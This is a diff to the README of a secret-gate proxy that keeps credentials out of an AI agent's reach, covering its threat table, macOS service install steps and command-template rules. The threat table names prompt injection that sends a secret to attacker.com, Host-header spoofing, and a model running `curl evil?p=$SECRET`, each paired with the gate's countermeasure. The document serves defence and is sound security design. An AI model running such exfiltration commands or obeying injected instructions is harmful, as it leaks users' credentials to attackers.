@@ -18,7 +18,7 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 | Model reads the secret | It only ever holds ciphertext; there is no `decrypt` verb |
 | Prompt injection sends the secret to attacker.com | Allowed hosts are sealed inside the token; wrong host → HTTP 403 |
 | Request to attacker.com with `Host: allowed.example` (or domain fronting through a CDN) | Policy uses the address the proxy really connects to; a Host header naming another host is refused |
-| Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args |
+| Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args (no args starting with `-`); the value goes in by env or stdin, never on a command line |
 | Site echoes the value back | Proxy / ops redact every resolved value in responses and command output |
 | Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
 | Private key leaks | Install the gate service (`secret-gate system install`, below): keys belong to the role account `_agentswitchgate`, unreadable for the login user; without it, keep `~/.secret-gate/` deny-listed for agents |
@@ -102,7 +102,8 @@ directories; `Umask 077`, `RunAtLoad`, `KeepAlive`; output to `gate/logs/{proxy,
 ```bash
 # root (the Mac app asks for an administrator once)
 secret-gate system install --owner-uid $(id -u) --port 8080 \
-    --runtime /path/AgentSwitch.app/Contents/Resources/runtime --migrate-from ~/.secret-gate [--dry-run]
+    --runtime /path/AgentSwitch.app/Contents/Resources/runtime --migrate-from ~/.secret-gate \
+    [--import-config] [--dry-run]
 secret-gate system update --runtime …/runtime [--port N] [--dry-run]    # swap runtime/, restart; data stays
 secret-gate system uninstall [--delete-keys] [--dry-run]                # keys and the account stay by default
 # anyone
@@ -112,13 +113,20 @@ secret-gate system status [--json]
 `install` creates the account (`dseditgroup`, `sysadminctl -addUser _agentswitchgate … -roleAccount`),
 the directories, the runtime copy and gate-service.json; migrates the old home: every keypair becomes a
 **legacy** keypair (decrypt only, never current again; `keys retire <name>` deletes one), a new keypair `main`
-becomes current, `refs.sqlite3`, the three trusted config files and old logs move in; generates a new
+becomes current, `refs.sqlite3` (rebuilt from its valid rows, never taken over as a file),
+`screenshot-mask.json` and old logs move in. `exec_templates.json` and `upstream-insecure.txt` were writable by
+every process of the login user, so they move in only with `--import-config`; without it the plan and the report
+list them as not imported, with what they would do (template names, argv, env, stdin; the hosts whose upstream
+certificate would go unchecked), and they stay in `~/.secret-gate` (the Mac app does not pass the flag). Generates a new
 mitmproxy CA in `gate/mitmproxy/` and publishes `ca.pem`; writes and bootstraps both LaunchDaemons and
 waits until `status` reports the proxy running and the migrated keys. Only then are the originals deleted
 (each only where an identical copy is in the service), the old CA private key in `~/.mitmproxy` removed and
 `~/.secret-gate/MOVED.txt` written. Any failing step stops the run and lists what was done and what was not;
 nothing is rolled back. Root touches the login user's directories only through `O_NOFOLLOW` directory
-descriptors. Stop a gate the Mac app started itself before installing: the service's proxy needs the port.
+descriptors. The runtime is copied the same way: the bundle's `python/`, `secret-gate/` and `VERSIONS` are never
+followed if they are symlinks, every entry is opened relative to its parent with `O_NOFOLLOW`, must belong to the
+bundle's owner (no hard link to a root-only file) and be a regular file, directory or symlink; links are kept and
+must stay inside the copy; modes are set as the copy is made, nothing outside it is ever chmodded. Stop a gate the Mac app started itself before installing: the service's proxy needs the port.
 `--root <prefix>` moves every system path under a prefix and only lists the privileged commands (tests).
 
 `status --json` → `{"installed", "running", "rpcRunning", "proxyRunning", "proxyPort", "runtimeVersion",
@@ -205,6 +213,20 @@ otherwise a password for one of them would be accepted by all of them.
 Give the token to the agent as if it were the password. Uses: `http` (proxy, `secret_http` and
 browser fills), `fill` (browser fills only: the proxy and `secret_http` refuse it), `otp`
 (`secret_otp`), `exec` (`secret_exec` with `exec_templates.json`).
+
+`exec_templates.json` (see `config/exec_templates.example.json`):
+
+```json
+{"psql": {"argv": ["psql", "-h", "{ARG0}", "-U", "{ARG1}", "-c", "{ARG2}"], "env": {"PGPASSWORD": "{SECRET}"}, "max_args": 3},
+ "tool": {"argv": ["/usr/local/bin/tool", "login", "--password-stdin"], "stdin": "{SECRET}\n"}}
+```
+
+`{SECRET}` may appear only in `env` values and `stdin`: a template with `{SECRET}` in `argv` is refused when the
+templates load (a command line is visible to every user of the machine). `{ARGn}` are the caller's args, only in
+`argv`; each must match `[A-Za-z0-9._@:/=+,-]`, at most 256 characters, and may not start with `-` (an option). The
+child gets only `PATH`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ` from the gate plus the template's `env`; its stdin is
+the template's `stdin` or empty. stdout and stderr are redacted before they return. `exec` is not bound to the
+token's hosts: whatever host a template lets the caller name gets the value, so keep templates to what you trust.
 
 ## Short references (`enc:ref:`)
 
